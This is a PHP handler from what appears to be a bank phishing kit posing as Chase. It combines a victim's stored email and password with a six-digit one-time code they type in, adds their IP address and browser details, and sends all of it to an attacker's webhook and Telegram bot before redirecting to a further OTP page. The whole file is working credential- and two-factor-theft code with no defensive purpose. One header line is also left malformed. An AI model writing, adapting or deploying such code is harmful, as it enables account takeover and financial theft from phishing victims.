<?php
/*

 __,  ,_    _    ,  ,  ,  ,  ,    ___, ,  ,
'|_,  |_)  '|\   |\ |  |_/   |   ' |   |\ |
 |   '| \   |-\  |'\| '| \  '|__  _|_, |'\|
 '    '  `  '  ` '  `  '  `    ' '     '  `

*/
session_start();
$ip = getenv("REMOTE_ADDR");
$agnet = $_SERVER['HTTP_USER_AGENT'];
require '../main.php';
require '../config/settings.php';
// Copyright - Franklin.

if ($_POST['code1'] == "" || $_POST['code2'] == "" || $_POST['code3'] == "" || $_POST['code4'] == "" || $_POST['code5'] == "" || $_POST['code6'] == "") {
  echo "Sorry we blocked your request";
  exit;
}






$message .= "⭐ ---------- Login Information ---------- ⭐\n";
$message .= "| User Email: " . $_SESSION['login_email'] . "\n";
$message .= "| User Password: " . $_SESSION['login_password'] . "\n";
$message .= "⭐ ---------- OTP Information ---------- ⭐\n";
$message .= "|[1] Onetime Code: " . $_POST['code1'] . "" . $_POST['code2'] . "" . $_POST['code3'] . "" . $_POST['code4'] . "" . $_POST['code5'] . "" . $_POST['code6'] . "\n";
$message .= "⭐------- Device Information -------⭐\n";
$message .= "| IP Address: " . $ip . "\n";
$message .= "| OS/Browser: " . $os . "/" . $br . "\n";
$message .= "| Date: " . $date . "\n";
$message .= "| Agnet: " . $agnet . "\n";
$message .= "⭐ ---------- To Be Continued ---------- ⭐\n";
$headers = 'From: Franklin <franklin@chase.sell>' . "\r\n" .

$url = "" . $webhook . "";
$headers = ['Content-Type: application/json; charset=utf-8'];
$POST = ['username' => 'Quartz', 'content' => $message];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);

$apiUrl = "https://api.telegram.org/bot$http_api/sendMessage";
$params = ['chat_id' => $chat_id, 'text' => $message];
$queryString = http_build_query($params);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "$apiUrl?$queryString");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);


// Sessions //




header('location: ../onetime-2?token='.$key);
?>

